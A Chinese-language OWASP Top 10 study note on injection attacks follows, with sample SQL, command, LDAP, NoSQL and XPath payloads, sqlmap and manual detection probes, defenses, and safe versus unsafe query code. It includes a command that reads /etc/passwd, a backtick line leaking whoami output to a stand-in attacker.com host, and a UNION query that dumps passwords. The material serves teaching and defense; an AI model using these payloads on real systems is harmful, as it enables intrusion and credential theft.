# OWASP Top 10: A03 - 注入攻击 (Injection)

## 概述

注入攻击发生在不可信数据作为命令或查询的一部分发送到解释器时。攻击者的恶意数据可以欺骗解释器执行非预期的命令或访问未经授权的数据。最常见的是 SQL 注入、命令注入和 LDAP 注入。

## 常见注入类型

### 1. SQL 注入 (SQLi)
```sql
-- 经典登录绕过
' OR '1'='1' --

-- 联合查询注入
' UNION SELECT username, password FROM users --

-- 盲注（基于时间）
' AND IF(1=1, SLEEP(5), 0) --
```

### 2. 命令注入
```bash
# 通过参数注入系统命令
ping 127.0.0.1; cat /etc/passwd

# 使用反引号
ping `whoami`.attacker.com
```

### 3. LDAP 注入
```
# 绕过 LDAP 认证
*)(uid=*))(|(uid=*
```

### 4. NoSQL 注入
```javascript
// MongoDB 注入
{"username": {"$ne": null}, "password": {"$ne": null}}
```

### 5. XPath 注入
```
' or '1'='1
```

## 检测方法

```bash
# SQLmap 自动化检测
sqlmap -u "https://target.com/page?id=1" --batch

# 手动检测（观察错误和响应差异）
# 输入单引号 ' 观察是否报错
# 输入 1' OR '1'='1 观察是否返回异常数据
# 输入 1' AND SLEEP(5)-- 观察响应时间

# 命令注入检测
# 输入 ; id
# 输入 | whoami
# 输入 `whoami`
```

## 防御措施

- **参数化查询**：使用预编译语句，不拼接 SQL
- **输入验证**：白名单校验，拒绝不符合预期的输入
- **转义特殊字符**：对输出进行适当编码
- **最小权限**：数据库账户仅授予必要权限
- **ORM 框架**：正确使用 ORM，避免原生 SQL 拼接
- **WAF 部署**：Web 应用防火墙拦截恶意请求

## 各语言安全示例

```python
# 正确：参数化查询
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# 错误：字符串拼接
cursor.execute("SELECT * FROM users WHERE id = " + user_id)
```

```java
// 正确：PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

// 错误：字符串拼接
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM users WHERE id = " + userId);
```
